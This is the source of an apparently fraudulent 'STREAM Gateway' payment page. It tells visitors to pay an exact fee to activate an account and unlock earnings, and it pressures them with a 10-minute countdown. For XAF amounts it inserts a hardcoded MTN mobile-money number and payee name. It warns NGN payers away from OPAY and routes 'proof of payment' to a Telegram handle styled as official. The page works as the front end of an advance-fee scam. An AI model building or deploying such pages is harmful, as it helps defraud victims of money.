<!DOCTYPE html>
<html lang="en">

<head>
    <title>STREAM Gateway</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="color-scheme" content="light only">
    <meta name="description" content="Complete your STREAM registration payment.">

    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">

    <style>
        /* --- Reset & Variables --- */
        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            border: 0;
        }

        body {
            font-family: 'Poppins', sans-serif;
            line-height: 1.5;
            background-color: #f9f9f9;
            color: #333;
            display: flex;
            justify-content: center;
            padding: 2rem 1rem;
            min-height: 100vh;
        }

        a {
            text-decoration: none;
            color: inherit;
        }

        :root {
            --bg-card: #ffffff;
            --accent-primary: #007BFF;
            --accent-secondary: #0056b3;
            --highlight: #FFD700;
            --text-dark: #333;
            --text-light: #fff;
            --border: #e0e0e0;
            --notification-bg: #007BFF;
            --modal-overlay: rgba(0, 0, 0, 0.6);
        }

        .container {
            max-width: 420px;
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 1.25rem;
            align-items: center;
        }

        /* --- Icons & Info --- */
        .lock-icon {
            color: var(--accent-primary);
            margin-bottom: 0.5rem;
        }

        .lock-icon svg {
            width: 32px;
            height: 32px;
        }

        .info-box {
            width: 100%;
            padding: 1.5rem;
            border-radius: 16px;
            text-align: center;
            font-weight: 600;
            font-size: 1rem;
            background-color: var(--highlight);
            color: var(--text-dark);
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }

        /* --- Payment Card --- */
        .main-payment-card {
            background-color: var(--bg-card);
            border-radius: 16px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
            width: 100%;
            padding: 1.5rem;
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }

        /* --- Payment Portal --- */
        .payment-portal-section {
            background-color: var(--accent-primary);
            padding: 1rem 0.8rem;
            border-radius: 10px;
            text-align: center;
            color: var(--text-light);
            box-shadow: 0 5px 12px rgba(0, 0, 0, 0.2);
        }

        .payment-portal-section h2 {
            font-size: 1.25rem;
            font-weight: 700;
            color: var(--highlight);
            margin-bottom: 0.5rem;
        }

        .payment-portal-section .timer-prompt {
            font-size: 0.9rem;
            font-weight: 600;
            margin-bottom: 0.3rem;
        }

        .payment-portal-section #countdown-timer {
            font-family: monospace;
            font-size: 2rem;
            font-weight: 700;
            color: #FFD700;
            margin-bottom: 0.5rem;
        }

        .payment-portal-section .portal-info-text {
            font-size: 0.85rem;
            line-height: 1.4;
        }

        /* --- Account Boxes --- */
        .account-box {
            width: 100%;
            padding: 1.5rem;
            border-radius: 16px;
            background-color: var(--bg-card);
            border: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.75rem;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
            transition: all 0.5s ease;
        }

        .account-box.hidden {
            opacity: 0;
            height: 0;
            padding: 0;
            margin: 0;
            overflow: hidden;
            transform: translateY(20px);
        }

        .account-box .merchant-title {
            font-size: 1.1rem;
            font-weight: 700;
            color: var(--highlight);
            text-align: center;
            text-transform: uppercase;
        }

        .account-box .bank-name {
            font-size: 1.1rem;
            font-weight: 600;
            color: var(--accent-primary);
        }

        .account-number-wrapper {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            cursor: pointer;
            padding: 0.5rem;
            border-radius: 8px;
            transition: background 0.2s ease;
        }

        .account-number-wrapper:hover {
            background-color: rgba(0, 123, 255, 0.1);
        }

        .account-number {
            font-size: 1.75rem;
            font-weight: 700;
            color: var(--accent-secondary);
            letter-spacing: 2px;
        }

        .copy-icon svg {
            width: 24px;
            height: 24px;
            fill: var(--text-dark);
            opacity: 0.7;
        }

        .account-name {
            font-size: 1rem;
            font-weight: 600;
            color: var(--text-dark);
        }

        /* --- Instructions & Button --- */
        .instruction-text {
            font-size: 0.95rem;
            text-align: center;
            color: var(--text-dark);
            transition: all 0.5s ease;
        }

        .instruction-text.hidden {
            opacity: 0;
            height: 0;
            margin: 0;
            overflow: hidden;
            transform: translateY(10px);
        }

        .verify-button {
            width: 100%;
            padding: 1rem;
            border: none;
            border-radius: 12px;
            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
            color: var(--text-light);
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 4px 15px rgba(0, 123, 255, 0.3);
            margin-top: 1rem;
            text-align: center;
            display: inline-block;
        }

        .verify-button:hover {
            background: linear-gradient(90deg, #0056b3, #004080);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 123, 255, 0.4);
        }

        .verify-button:active {
            transform: scale(0.98);
            box-shadow: 0 2px 10px rgba(0, 123, 255, 0.2);
        }

        .verify-button.disabled {
            opacity: 0.6;
            cursor: not-allowed;
            pointer-events: none;
            box-shadow: none;
            filter: grayscale(1);
        }

        /* --- Copy Notification --- */
        #copy-notification {
            position: fixed;
            bottom: 2rem;
            left: 50%;
            transform: translateX(-50%);
            background-color: var(--notification-bg);
            color: var(--text-light);
            padding: 0.75rem 1.5rem;
            border-radius: 2rem;
            font-size: 0.9rem;
            font-weight: 500;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
            z-index: 1000;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
        }

        #copy-notification.show {
            opacity: 1;
            visibility: visible;
        }

        /* --- Modal --- */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: var(--modal-overlay);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 2000;
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal-content {
            background-color: var(--bg-card);
            color: var(--text-dark);
            border-radius: 12px;
            padding: 30px;
            max-width: 90%;
            width: 450px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
            position: relative;
            animation: fadeInScale 0.3s ease-out;
        }

        @keyframes fadeInScale {
            from {
                opacity: 0;
                transform: scale(0.9);
            }

            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .modal-close-btn {
            position: absolute;
            top: 15px;
            right: 18px;
            font-size: 28px;
            font-weight: 700;
            cursor: pointer;
            color: var(--text-dark);
            transition: color 0.2s;
        }

        .modal-close-btn:hover {
            color: var(--accent-primary);
        }

        .modal-content p {
            margin-bottom: 1rem;
            line-height: 1.6;
        }

        .modal-content strong {
            color: var(--accent-primary);
        }

        .modal-content .verify-button {
            margin-top: 20px;
            padding: 12px;
            font-size: 1rem;
        }
    </style>
</head>

<body>
    <div class="container">

        <!-- Lock Icon -->
        <div class="lock-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                <path
                    d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z" />
            </svg>
        </div>

        <!-- Info Box -->
        <div class="info-box">
            To activate your STREAM account and unlock earnings features, kindly transfer exactly <span id="exact"></span> to the account
            below.
        </div>

        <!-- Payment Card -->
        <div class="main-payment-card">
            <div class="payment-portal-section">
                <h2>Protected Payment Gateway</h2>
                <p class="timer-prompt" id="timer-prompt">Complete payment within:</p>
                <div id="countdown-timer">10:00</div>
                <p class="portal-info-text">Your payment is processed securely. Access will be enabled immediately after
                    confirmation.</p>
            </div>

            <!-- Account Details -->
            <div id="payment-account-details-group">
                
            </div>

            <p class="instruction-text" id="instruction-text">After completing the transfer, tap the button below to
                submit your proof and finalize activation.</p>
        </div>

        <a href="javascript: void(0);" onclick="subm()"
            class="verify-button" id="verify-payment-telegram">I’ve completed my payment</a>

    </div>

    <div id="copy-notification">Account Number Copied!</div>

    <style>
        .none {
            display: none;
        }
    </style>
    <!-- Modal -->
    <div class="pop_modal"></div>

    <script>
document.addEventListener("DOMContentLoaded", function () {

    /* ================================
       SAFE LOCAL STORAGE FETCH
    =================================== */

    const acctdtlRaw = localStorage.getItem("paymentDetails");

    if (!acctdtlRaw) return;

    let acctdtl;

    try {
        acctdtl = JSON.parse(acctdtlRaw);
    } catch (err) {
        console.error("Invalid paymentDetails in localStorage");
        return;
    }

    const bankname = acctdtl.bankname || "";
    const accountname = acctdtl.accontname || "";
    const acn = acctdtl.acn || "";
    const amttopay = acctdtl.amount || "";

    /* ================================
       SET EXACT AMOUNT TEXT
    =================================== */

    const exactAmount = document.getElementById("exact");
    if (exactAmount) exactAmount.textContent = amttopay;

    /* ================================
       BUILD ACCOUNT DETAILS
    =================================== */

    let extraBankHtml = "";

    if (amttopay.toLowerCase().includes("xaf")) {
        extraBankHtml = `
        <div class="account-box">
            <p class="merchant-title">MTN</p>
            <p class="bank-name">${amttopay}</p>
            <div class="account-number-wrapper" data-copy-text="652856398">
                <span class="account-number">652856398</span>
                <span class="copy-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
                    </svg>
                </span>
            </div>
            <p class="account-name">BELTUS EBOB</p>
        </div>
        `;
    }

    const mainAccountHtml = `
        <div class="account-box">
            <p class="merchant-title">${bankname}</p>
            <p class="bank-name">${amttopay}</p>
            <div class="account-number-wrapper" data-copy-text="${acn}">
                <span class="account-number">${acn}</span>
                <span class="copy-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
                    </svg>
                </span>
            </div>
            <p class="account-name">${accountname}</p>
        </div>
    `;

    const accountContainer = document.getElementById("payment-account-details-group");
    if (accountContainer) {
        accountContainer.innerHTML = mainAccountHtml + extraBankHtml;
    }

    /* ================================
       COPY FUNCTION (EVENT DELEGATION)
    =================================== */

    document.addEventListener("click", function (e) {
        const wrapper = e.target.closest(".account-number-wrapper");
        if (!wrapper) return;

        const textToCopy = wrapper.dataset.copyText;
        const notification = document.getElementById("copy-notification");

        if (navigator.clipboard && textToCopy) {
            navigator.clipboard.writeText(textToCopy).then(() => {
                notification.classList.add("show");
                setTimeout(() => {
                    notification.classList.remove("show");
                }, 2000);
            });
        }
    });

    /* ================================
       NGN WARNING MODAL
    =================================== */

    if (amttopay.toLowerCase().includes("ngn")) {

        document.querySelector(".pop_modal").innerHTML = `
        <div id="warningModal" class="modal-overlay active">
            <div class="modal-content">
                <span class="modal-close-btn" id="closeModalX">&times;</span>
                <p><strong>⚠️ PAYMENT NOTICE:</strong></p>
                <p>
                    Please avoid using OPAY for this transaction, as it may delay confirmation and affect withdrawals.
                    STREAM supports Palmpay, Moniepoint, POS transfers, and all major banks except OPAY.
                </p>
                <button id="dismissModalBtn" class="verify-button">Understood</button>
            </div>
        </div>
        `;

        const modal = document.getElementById("warningModal");
        const closeBtn = document.getElementById("closeModalX");
        const dismissBtn = document.getElementById("dismissModalBtn");

        const closeModal = () => {
            modal.remove();
            document.body.style.overflow = "auto";
        };

        document.body.style.overflow = "hidden";

        closeBtn.addEventListener("click", closeModal);
        dismissBtn.addEventListener("click", closeModal);
        modal.addEventListener("click", (e) => {
            if (e.target === modal) closeModal();
        });

        document.addEventListener("keydown", (e) => {
            if (e.key === "Escape") closeModal();
        });
    }

    /* ================================
       COUNTDOWN TIMER
    =================================== */

    const countdownDisplay = document.getElementById("countdown-timer");
    const timerPrompt = document.getElementById("timer-prompt");
    const accountDetailsGroup = document.getElementById("payment-account-details-group");
    const instructionText = document.getElementById("instruction-text");
    const verifyButton = document.getElementById("verify-payment-telegram");

    let timeRemaining = 10 * 60;

    const formatTime = (seconds) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`;
    };

    function updateCountdown() {

        if (timeRemaining <= 0) {
            clearInterval(interval);

            countdownDisplay.textContent = "00:00";
            timerPrompt.innerHTML = `<span style="color:#ff0000;font-weight:700;">Payment window expired!</span>`;

            accountDetailsGroup.classList.add("hidden");
            instructionText.classList.add("hidden");

            verifyButton.classList.add("disabled");
            verifyButton.textContent = "Payment Expired";
            verifyButton.href = "#";

            return;
        }

        countdownDisplay.textContent = formatTime(timeRemaining);
        timeRemaining--;
    }

    updateCountdown();
    const interval = setInterval(updateCountdown, 1000);

});



function subm() {
    const msgreg = localStorage.getItem("reg");

    if (!msgreg) return;

    const encodedMsg = encodeURIComponent(msgreg);

    const tgAppLink = `tg://resolve?domain=STREAMOFFICIA_L&text=${encodedMsg}`;
    const tgWebLink = `https://t.me/STREAMOFFICIA_L?text=${encodedMsg}`;

    // Try opening Telegram app
    window.location.href = tgAppLink;

    // Fallback to web after short delay
    setTimeout(() => {
        window.location.href = tgWebLink;
    }, 1500);
}





</script>

</body>


</html>
